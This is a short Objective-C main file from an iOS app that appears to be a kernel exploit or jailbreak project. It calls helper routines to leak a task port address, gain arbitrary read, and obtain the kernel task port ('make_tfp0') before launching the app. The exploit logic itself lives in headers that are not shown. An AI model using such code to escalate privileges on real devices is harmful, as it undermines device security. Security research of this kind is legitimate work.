#import "AppDelegate.h"
#import <UIKit/UIKit.h>

#include "iosurface.h"
#include "get_port.h"
#include "get_fd_ofiles.h"
#include "exploit.h"
#include "read.h"
int main(int argc, char * argv[]) {
    IOSurface_init();
    uint64_t task_port;
    
    if(!get_port_addr(mach_task_self(), &task_port)){
        printf("failed on get port_addr\n");
        return 0;
    }
    //im2(task_port);
    uint64_t fd_ofiles;
    printf("wow.. I got a port_addr\n");
    printf("now i can do Arbitiary Read\n");
    get_fd_ofiles_addr(task_port,&fd_ofiles);
    
    make_tfp0(task_port,fd_ofiles);
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
